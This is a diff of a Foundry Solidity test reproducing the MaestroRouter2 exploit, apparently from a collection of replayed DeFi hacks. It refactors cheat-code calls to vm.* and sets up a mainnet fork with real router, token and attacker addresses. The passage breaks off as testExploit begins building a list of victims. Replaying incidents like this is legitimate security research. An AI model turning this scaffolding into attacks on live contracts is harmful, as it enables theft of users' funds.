@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo -- Total Lost : ~280 ETH
 // Attacker : https://etherscan.io/address/0xce6397e53c13ff2903ffe8735e478d31e648a2c6
@@ -31,25 +30,23 @@ interface IMaestroRouter {}
 
 contract MaestroRouter2Exploit is Test {
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     IMaestroRouter router = IMaestroRouter(0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e);
     address router_logic = 0x8EAE9827b45bcC6570c4e82b9E4FE76692b2ff7a;
     IERC20 Mog = IERC20(0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a);
-    WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    Uni_Router_V2 UniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IUniswapV2Router UniRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet");
+        vm.createSelectFork("mainnet");
 
-        cheats.label(address(router), "MaestroRouter2");
-        cheats.label(address(router_logic), "MaestroRouter2 Logic Contract");
-        cheats.label(address(Mog), "Mog Token");
-        cheats.label(address(UniRouter), "UniswapRouterV2");
+        vm.label(address(router), "MaestroRouter2");
+        vm.label(address(router_logic), "MaestroRouter2 Logic Contract");
+        vm.label(address(Mog), "Mog Token");
+        vm.label(address(UniRouter), "UniswapRouterV2");
     }
 
     function testExploit() public {
-        cheats.rollFork(18_423_219);
+        vm.rollFork(18_423_219);
         emit log_named_decimal_uint("Attacker Mog balance before exploit", Mog.balanceOf(address(this)), Mog.decimals());
 
         address[] memory victims = new address[](7);
